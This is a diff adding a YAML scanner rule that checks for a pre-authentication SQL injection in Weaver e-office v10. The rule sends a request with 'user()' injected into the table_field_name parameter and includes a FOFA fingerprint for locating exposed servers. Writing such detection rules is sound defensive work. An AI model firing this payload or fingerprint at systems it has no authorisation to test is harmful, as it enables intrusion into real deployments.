@@ -1,0 +1,14 @@
+name: e-office-v10-sql-inject
+rules:
+  - method: GET
+    path: /eoffice10/server/ext/system_support/leave_record.php?flow_id=1&run_id=1&table_field=1&table_field_name=user()&max_rows=10
+    follow_redirects: false
+    expression: |
+      response.status == 200 && response.body.bcontains(b'<p>未找到相关数据</p>')
+detail:
+  author: Print1n(https://github.com/Print1n)
+  description: |
+    泛微 eoffice v10 前台 SQL 注入
+    FOFA：fid="2csJpuWtfTdSAavIfJTuBw=="
+  links:
+    - https://www.hedysx.com/2777.html
